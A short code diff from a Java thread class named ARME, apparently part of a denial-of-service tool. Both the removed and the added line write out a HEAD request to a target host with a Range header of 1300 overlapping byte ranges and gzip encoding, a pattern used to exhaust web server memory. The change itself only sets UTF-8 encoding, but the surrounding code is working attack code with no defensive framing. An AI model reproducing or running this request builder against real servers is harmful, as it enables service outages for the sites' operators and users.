@@ -21,7 +21,7 @@ public class ARME extends Thread {
 				for (int i = 0; i < 1300; i++) {
 					p += ",5-" + i;
 				}
-				sock.getOutputStream().write(("HEAD / HTTP/1.1\r\nHost: " + target + "\r\nRange:bytes=0-" + p + "\r\nAccept-Encoding: gzip\r\nConnection: close\r\n\r\n").getBytes());
+				sock.getOutputStream().write(("HEAD / HTTP/1.1\r\nHost: " + target + "\r\nRange:bytes=0-" + p + "\r\nAccept-Encoding: gzip\r\nConnection: close\r\n\r\n").getBytes("UTF-8"));
 				sock.close();
 			} catch (Exception ex) {
 				ex.printStackTrace();
